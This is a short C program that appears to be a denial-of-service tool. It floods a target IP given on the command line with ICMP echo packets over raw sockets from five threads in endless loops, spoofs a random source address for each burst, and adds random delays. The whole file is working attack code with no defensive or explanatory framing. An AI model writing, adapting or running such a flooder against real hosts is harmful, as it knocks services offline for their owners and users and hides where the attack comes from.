
#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include <pthread.h>
#include "header.h"
#include<unistd.h>

char *dest_ip;
static int PROTO_ICMP = 1;

void *send_icmpflood(void *tmp){
    int *fd = tmp;

    char *packet;
    //IP header pointer
    struct iphdr *iph = (struct iphdr *)packet;
    //ICMP header pointer
    struct icmphdr *icmph = (struct icmphdr *)(packet + sizeof (struct iphdr));

    int pktsize = sizeof (struct iphdr) + sizeof (struct icmphdr) + 64;
    packet =(char *)malloc (pktsize);
    iph = (struct iphdr *) packet; //the head of ip
    icmph = (struct icmphdr *) (packet + sizeof (struct iphdr)); 
    memset (packet, 0, pktsize);


    
    struct sockaddr_in to;
    to.sin_family = AF_INET;
    to.sin_port = htons(0);
    to.sin_addr.s_addr = inet_addr(dest_ip);
    
    
    //fill the IP header here
    iph->version=4;
    iph->ihl=5;
    iph->tos=0;
    iph->tot_len = pktsize;
    iph->id = htons (0);
    iph->frag_off = 0;
    iph->ttl = 255;

    iph->protocol = PROTO_ICMP;
    iph->check = 0;
    
    //destination adress
    iph->daddr = inet_addr(dest_ip);
    
    
    //ICMP type is echo
    icmph->type = ICMP_ECHO;
    //code is 0
    icmph->code = 0;
    icmph->checksum = htons (~(ICMP_ECHO << 8)); 
    
    while(1) {
    	// randomly generate the ip adress
        int srandom = rand() % 5;
        sleep(srandom);
        char source_ip[32];
        source_ip[0] = '\0';
        char buffer[4];
        sprintf(buffer, "%d", rand() % 256);
        strcat(source_ip, buffer);
        strcat(source_ip, ".");
        sprintf(buffer, "%d", rand() % 256);
        strcat(source_ip, buffer);
        strcat(source_ip, ".");
        sprintf(buffer, "%d", rand() % 256);
        strcat(source_ip, buffer);
        strcat(source_ip, ".");
        sprintf(buffer, "%d", rand() % 256);
        strcat(source_ip, buffer);
        iph->saddr=inet_addr(source_ip);

        int num = 4;
        while(num--) {
            if(sendto(*fd, packet, iph->tot_len, 0, (struct sockaddr *)&to, sizeof(to))<0) {
            //perror("Sending error");
            }
            else {
                //printf("Sent to %s:%d\n",dest_ip,dest_port);
            }
           int  urandom = rand() % 200 + 300;
            usleep(urandom);
        }
        
    }
    
}


int main(int argc, char *argv[])
{   
    dest_ip = argv[1];

    int fd = socket (AF_INET, SOCK_RAW, PROTO_ICMP);
        int hincl = 1;                  /* 1 = on, 0 = off */
        setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    if(fd < 0)
    {
        perror("Error creating raw socket ");
        exit(1);
    }
    
    pthread_t pthread[5];
    for(int i = 0; i < 5; i++) pthread_create(&pthread[i], NULL, send_icmpflood, &fd);
    for(int i = 0; i < 5; i++) pthread_join(pthread[i], NULL);
    return 0;
}